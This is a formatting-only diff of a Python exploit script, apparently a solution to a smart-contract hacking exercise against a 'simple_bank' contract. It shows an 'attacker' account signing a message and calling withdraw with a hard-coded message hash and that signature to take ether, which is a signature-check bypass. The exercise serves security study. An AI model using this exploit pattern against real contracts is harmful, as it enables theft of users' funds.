@@ -23,7 +23,7 @@ def hack():
     #     # increase the nonce
     #     attacker.transfer(attacker.address, value="1 wei")
 
-    #attack_contract = project.Hack.deploy(simple_bank.address, sender=attacker)
+    # attack_contract = project.Hack.deploy(simple_bank.address, sender=attacker)
 
     msg = "I will hack this contract"
     msghash = encode_defunct(text=msg)
@@ -34,7 +34,14 @@ def hack():
 
     msghash = "0x1476abb745d423bf09273f1afd887d951181d25adc66c4834a70491911b7f750"
 
-    simple_bank.withdraw(msghash, signature.v, signature.r, signature.s, value="0.1 ether", sender=attacker)
+    simple_bank.withdraw(
+        msghash,
+        signature.v,
+        signature.r,
+        signature.s,
+        value="0.1 ether",
+        sender=attacker,
+    )
 
 
 def main():
